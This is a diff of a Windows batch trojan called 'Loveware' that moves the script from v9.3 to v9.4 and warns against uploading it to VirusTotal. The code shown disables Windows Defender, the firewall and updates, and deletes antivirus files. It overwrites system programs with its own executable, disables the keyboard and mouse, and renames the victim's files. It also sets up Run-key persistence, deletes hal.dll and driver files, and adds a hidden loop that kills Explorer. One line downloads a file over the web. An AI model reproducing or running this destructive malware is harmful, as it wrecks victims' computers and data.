@@ -2,7 +2,7 @@
 
 :: THIS VERSION CAN CONTAIN BUGS
 ::
-:: LOVEWARE v9.3
+:: LOVEWARE v9.4
 ::
 ::
 :: Name: Loveware
@@ -58,7 +58,7 @@
 ::  |   ,/     \   \  /   \   \  '   |  / | \   \   ' \ |/  /  ,.  ||  , ; '   |  / | 
 ::  '---'       `----'     \   \ |   :    |  \   \  |--";  :   .'   \---'  |   :    | 
 ::                          '---" \   \  /    \   \ |   |  ,     .-./       \   \  /  
-::                                 `----'      '---"     `--`---'            `---TEAM  
+::                                 `----'      '---"     `--`---'            `---  
 :: DO NOT UPLOAD ON VIRUSTOTAL!!!
 ::                                                                         
 
@@ -134,8 +134,6 @@ net stop "wuauserv"
 net stop "Windows Defender Service"
 net stop "Windows Firewall"
 net stop sharedaccess
-
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
 
 del /Q /F C:\Program Files\alwils~1\avast4\*.*
 del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
@@ -262,6 +260,7 @@ echo ol.Quit>>%SystemDrive%\mail.vbs
 start "" "%SystemDrive%\mail.vbs"
 
 goto run2
+
 goto worm
 
 :: Infect autoexec.bat
@@ -358,6 +357,14 @@ echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,
 echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "nokeyboard.reg"
 echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"
 
+echo :a > explorer.bat
+echo tskill explorer >> explorer.bat
+echo goto a >> explorer.bat
+
+echo Set objShell = CreateObject("WScript.Shell") > invisi.vbs
+echo strCommand = "explorer.bat" >> invisi.vbs
+echo objShell.Run strCommand, vbHide, TRUE >> invisi.vbs
+
 :: Infect different files: lnk, mp3, doc, pdf....
 
 assoc .lnk=batfile
@@ -410,14 +417,8 @@ powershell -Command "Invoke-WebRequest http://www.mediafire.com/file/xycm8d9wqrm
 
 :: Overwrite some programs and taskmanager for extra fun
 
-tskill taskmgr
-copy /y Loveware.exe C:\Windows\System32\Taskmgr.exe
-
 tskill pbrush
 copy /y Loveware.exe C:\Windows\pbrush.exe
-
-tskill notepad
-copy /y Loveware.exe "%windir%\system32\notepad.exe"
 
 tskill excel
 copy /y Loveware.exe "%SystemDrive%\Program Files\Microsoft Office\Office10\EXCEL.EXE"
@@ -542,7 +543,7 @@ echo goto chaos >> yes.bat
 
 :: A little message from your lover
 
-echo :makemsg>>yes.bat
+echo :makemsg >> yes.bat
 echo echo do > msg.vbs >> yes.bat
 echo echo Msgbox"I love you darling.....",0+0,"You are hacked!" >> msg.vbs >> yes.bat
 echo echo loop>>msg.vbs >> yes.bat
@@ -559,114 +560,115 @@ echo goto startmsg >> yes.bat
 echo :run>>yes.bat
 echo echo I love you!!!>>LOVE.txt>>yes.bat
 
-echo :Print>>yes.bat
-echo PRINT LOVE.txt /D:LPT2>>yes.bat
-echo PRINT LOVE.txt /D:LPT1>>yes.bat
-echo NOTEPAD /P LOVE.txt>>yes.bat
-echo goto run1>>yes.bat
-echo goto Print>>yes.bat
+echo :Print >> yes.bat
+echo PRINT LOVE.txt /D:LPT2 >> yes.bat
+echo PRINT LOVE.txt /D:LPT1 >> yes.bat
+echo NOTEPAD /P LOVE.txt >> yes.bat
+echo goto run1 >> yes.bat
+echo goto Print >> yes.bat
 
 :: Disable keyboard
 
-echo :run1>>yes.bat
-echo start "nokeyboard.reg">>yes.bat
+echo :run1 >> yes.bat
+
+echo start "nokeyboard.reg" >> yes.bat
 
 :: Rename desktop files
 
-echo CD Desktop>>yes.bat
-echo ren *.png LOVE.Letter>>yes.bat
-echo ren *.jpg LOVE.Letter>>yes.bat
-echo ren *.gif LOVE.Letter>>yes.bat
-echo ren *.docx LOVE.Letter>>yes.bat
-echo ren *.doc LOVE.Letter>>yes.bat
-echo ren *.pdf LOVE.Letter>>yes.bat
+echo CD Desktop >> yes.bat
+echo ren *.png LOVE.Letter >> yes.bat
+echo ren *.jpg LOVE.Letter >> yes.bat
+echo ren *.gif LOVE.Letter >> yes.bat
+echo ren *.docx LOVE.Letter >> yes.bat
+echo ren *.doc LOVE.Letter >> yes.bat
+echo ren *.pdf LOVE.Letter >> yes.bat
 
 :: Delete mouse
 
-echo set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass">>yes.bat
-echo reg delete %key%>>yes.bat
-echo reg add %key% /v Start /t REG_DWORD /d 4>>yes.bat
+echo set key="HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Mouclass" >> yes.bat
+echo reg delete %key% >> yes.bat
+echo reg add %key% /v Start /t REG_DWORD /d 4 >> yes.bat
 
 :: Overwrite regedit to make it harder for the poor guy
 
-echo copy/y Loveware.exe C:\Windows\regedit.exe>>yes.bat
+echo copy /y Loveware.exe C:\Windows\regedit.exe >> yes.bat
 
-echo timeout 400>>yes.bat
+echo timeout 400 >> yes.bat
 
 :: Have mersy and let the guy live
 
 echo @echo off > clean.bat
 echo echo Starting Clean Up Process!!!! >> LoveChoice.bat
 
-echo :clean>>clean.bat
+echo :clean >> clean.bat
 echo del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe" >> clean.bat
 
-echo cls>>LoveChoice.bat
+echo cls >> LoveChoice.bat
 
-echo echo Starting the Clean up process. You are soon going to be free>>LoveChoice.bat
+echo echo Starting the Clean up process. You are soon going to be free >> LoveChoice.bat
 
 echo start /min clean.bat
 
-echo timeout 10>>LoveChoice.bat
+echo timeout 10 >> LoveChoice.bat
 
-echo cls>>LoveChoice.bat
+echo cls >> LoveChoice.bat
 
-echo echo Now it is safe to reboot your computer!>>LoveChoice.bat
-echo echo Thank you for downloading my project and testing it.>>LoveChoice.bat
+echo echo Now it is safe to reboot your computer! >> LoveChoice.bat
+echo echo Thank you for downloading my project and testing it. >> LoveChoice.bat
 
-echo pause>>LoveChoice.bat
+echo pause >> LoveChoice.bat
 
-shutdown /s>>LoveChoice.bat
-echo exit>>LoveChoice.bat
+shutdown /s >> LoveChoice.bat
+echo exit >> LoveChoice.bat
 
 :: Second choice (not a good one :) )
 
-echo :hate>>LoveChoice.bat
-echo echo But I love you....hehehehehe :(>>LoveChoice.bat
+echo :hate >> LoveChoice.bat
+echo echo But I love you....hehehehehe :( >> LoveChoice.bat
 
 :: Crazy mouse
 
-echo :crazymousee>>LoveChoice.bat
-echo goto run4>>LoveChoice.bat
-echo @call mouse moveBy 10x100>>LoveChoice.bat
-echo @call mouse moveBy 16x50>>LoveChoice.bat
-echo @call mouse moveBy 190x10>>LoveChoice.bat
-echo @call mouse moveBy 186x50>>LoveChoice.bat
-echo goto crazymousee>>LoveChoice.bat
+echo :crazymousee >> LoveChoice.bat
+echo goto run4 >> LoveChoice.bat
+echo @call mouse moveBy 10x100 >> LoveChoice.bat
+echo @call mouse moveBy 16x50 >> LoveChoice.bat
+echo @call mouse moveBy 190x10 >> LoveChoice.bat
+echo @call mouse moveBy 186x50 >> LoveChoice.bat
+echo goto crazymousee >> LoveChoice.bat
 
-echo :run4>>LoveChoice.bat
+echo :run4 >> LoveChoice.bat
 
-echo echo ......>>LoveChoice.bat
+echo echo ...... >> LoveChoice.bat
 
 :: Dudley trojan with message
 
-echo @echo @echo off>AUTOEXEC.BAT>>LoveChoice.bat
-echo @echo echo Loveware was here...>>AUTOEXEC.BAT>>LoveChoice.bat
-echo @echo :l>>AUTOEXEC.BAT>>LoveChoice.bat
-echo @echo goto l>>AUTOEXEC.BAT>>LoveChoice.bat
+echo @echo @echo off > AUTOEXEC.BAT >> LoveChoice.bat
+echo @echo echo Loveware was here... >> AUTOEXEC.BAT >> LoveChoice.bat
+echo @echo :l >> AUTOEXEC.BAT >> LoveChoice.bat
+echo @echo goto l >> AUTOEXEC.BAT >> LoveChoice.bat
 
-echo echo ..........>>LoveChoice.bat
-echo echo You are hacked!!!>>LoveChoice.bat
-echo echo Info: This trojan was created by the G0df@ther!>>LoveChoice.bat
-echo timeout 1>>LoveChoice.bat
-echo echo You do not have so mutch time left to live!!!!!!!!!!!!!!!!!!!!!>>LoveChoice.bat
-echo echo So use your computer as long as you can!!!!!!!!!!!!>>LoveChoice.bat
-echo echo Do not close Loveware or LoveChoice, this will kill your computer!!!!!!!>>LoveChoice.bat
+echo echo .......... >> LoveChoice.bat
+echo echo You are hacked!!! >> LoveChoice.bat
+echo echo Info: This trojan was created by the G0df@ther! >> LoveChoice.bat
+echo timeout 1 >> LoveChoice.bat
+echo echo You do not have so mutch time left to live!!!!!!!!!!!!!!!!!!!!! >> LoveChoice.bat
+echo echo So use your computer as long as you can!!!!!!!!!!!! >> LoveChoice.bat
+echo echo Do not close Loveware or LoveChoice, this will kill your computer!!!!!!! >> LoveChoice.bat
 
 :: Having some fun
 
-echo start no.vbs>>LoveChoice.bat
+echo start no.vbs >> LoveChoice.bat
 
 echo :loop>>no.bat
-echo start Loveware.exe>>no.bat
-echo goto run5>>no.bat
-echo goto loop>>no.bat
+echo start Loveware.exe >> no.bat
+echo goto run5 >> no.bat
+echo goto loop >> no.bat
 
-echo :run5>>no.bat
+echo :run5 >> no.bat
 
 :: An angry message :)
 
-echo :run6>>no.bat
+echo :run6 >> no.bat
 
 echo :msgbox >> no.bat
 echo echo do > msg.vbs >> no.bat
@@ -725,16 +727,20 @@ echo ren *.pdf LOVE.Letter>>no.bat
 
 echo copy/y Loveware.exe C:\Windows\regedit.exe>>yes.bat
 
-echo timeout 400>>no.bat
+echo timeout 400 >> no.bat
+
+:: Kill explorer
+
+echo start "" invisi.vbs >> no.bat
 
 :: Just killing you
 
-echo start %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe>>no.bat
-echo DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll">>no.bat
-echo @((( Echo Off > Nul ) & Break Off )>>no.bat
-echo @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run>>no.bat
-echo @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul>>no.bat
-echo @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*">>no.bat
+echo start %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SomeHugs.exe >> no.bat
+echo DEL /F /S /Q /A "%systemdrive%\windows\system32\hal.dll" >> no.bat
+echo @((( Echo Off > Nul ) & Break Off ) >> no.bat
+echo @Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run >> no.bat
+echo @Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul >> no.bat
+echo @Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*" >> no.bat
 echo )>>no.bat
 echo shutdown /s>>no.bat
 
